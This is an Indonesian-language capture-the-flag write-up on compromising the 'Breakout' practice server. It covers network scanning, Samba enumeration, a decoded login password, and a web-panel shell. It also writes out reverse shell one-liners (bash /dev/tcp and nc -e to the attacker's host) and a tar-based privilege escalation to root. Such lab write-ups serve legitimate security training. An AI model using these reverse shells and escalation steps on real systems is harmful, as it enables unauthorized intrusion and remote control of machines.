# Laporan Serangan Server Breakout
Ini adalah hasil serangan yang telah dilakukan pada server Breakout untuk latihan serangan.

## Pencarian IP Address Server

- cek ip pc : 
	- cara 1
		```
		ip a
		```
	- cara 2
		```
		ifconfig
		```

- scan jaringan
	- nmap 
		```
		nmap -sP <network_id>/<prefix>
		```
	- netdicover 
		```
		netdiscover -i <interface>
		```

- uji koneksi, kali linux dan server Breakout
	```
	ping <ip_server>
	```

## Scan Port Server dengan NMAP
- nmap : 
	```
	nmap -p- -A -T4 <ip_server>
	```

**Port** yang terbuka dari server adalah :
- http (80)
- samba (139)
- samba (445)
- http miniserv (1000)
- http miniserv (2000)

## Access HTTP MINISERV Port 1000 & 2000
- gunakan url browser
	- http (1000)
		```
		http://<ip_server>:1000
		```
	- http (2000)
		```
		http://<ip_server>:2000
		```

**Note :** jika dialihkan menggunakan **https** maka ikuti


## Access Samba 
- coba login dengan password blank
	```
	smbclient -L //<ip_server>
	```
- jika gagal, proses pencarian celah lainnya


## Access Username pada Samba (139) dan (445)
- enum
	```
	enum4linux -a <ip_server>
	```
- scroll kebawah temukan user dengan (local user)
- maka username : **cyber**
- buka port http (80)
- buka full source code web
- paling bawah terdapat pesan enkripsi
- decrypt:
	```
	https://www.dcode.fr/brainfuck-language
	```
- password : **.2uqPEfj3D< P'a-3**
- login pada port 2000
- klik menu shell (terminal)
- buka terminal listener : 
	```
	nc -lvnp 2020
	```
- reverse shells
	- bash 
		```
		bash -i >& /dev/tcp/<ip_kali>/2020 0>&1
		```
	- netcat
		```
		nc -e /bin/bash <ip_kali> 2020
		```
- mode terminal
	```
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	```
	```
	export TERM=xterm
	```

## Local Privilege Escalation
- waktu proses pencarian, terdapat file : **.old_pass.bak**
- pada folder **/var/backups**
- access file
	```
	./tar -cf mypass.tar /var/backups/.old_pass.bak
	./tar -xf mypass.tar
	cat var/backups/.old_pass.bak
	su root

	```
- gunakan password yang sudah ditampilkan
- temukan flag
	```
	cat /root/rOOt.txt
	```